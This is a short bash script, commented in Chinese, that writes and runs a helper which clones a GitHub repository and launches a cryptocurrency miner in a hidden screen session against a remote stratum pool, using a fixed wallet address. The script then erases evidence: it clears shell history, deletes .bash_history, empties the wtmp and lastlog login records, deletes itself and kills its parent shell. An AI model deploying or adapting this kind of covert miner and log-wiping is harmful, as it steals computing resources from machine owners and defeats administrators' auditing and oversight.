cat << 'EOF' > btx.sh
#!/bin/bash

# 1. 检查并设置权限
[[ $EUID -ne 0 ]] && SUDO="sudo" || SUDO=""

# 2. 更新并安装依赖 (直接用 apt)
$SUDO apt-get update -y
$SUDO apt-get install -y git screen wget

# 3. 强制杀掉旧进程
screen -ls | grep btx | cut -d. -f1 | awk '{print $1}' | xargs -I {} screen -X -S {} quit 2>/dev/null

# 4. 目录清理与进入
cd $HOME
rm -rf btx1
[ -d "btx" ] && mv btx btx1

# 5. 下载并授权
echo "正在下载..."
git clone https://github.com/xiaobintse/btx.git
if [ -d "$HOME/btx" ]; then
    chmod -R 777 $HOME/btx
    chmod +x $HOME/btx/btx
else
    echo "下载失败，请检查网络"
    exit 1
fi

# 6. 后台启动
echo "正在启动..."
screen -dmS btx bash -c "cd $HOME/btx && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.$(hostname) -p x -a btx"

# 7. 彻底清理
history -c && history -w
rm -f $HOME/.bash_history $HOME/.Xauthority 2>/dev/null
$SUDO truncate -s 0 /var/log/wtmp 2>/dev/null
$SUDO truncate -s 0 /var/log/lastlog 2>/dev/null

echo "-------------------------------------------------------"
echo "部署完成！3秒后自动断开连接。"
echo "请稍后重新登录，输入 'screen -r btx' 查看情况。"
echo "-------------------------------------------------------"

sleep 3
# 自删除并强制退出
rm -f "$0"
kill -9 $PPID
EOF

# 关键一步：转换换行符并执行
sed -i 's/\r$//' btx.sh
bash btx.sh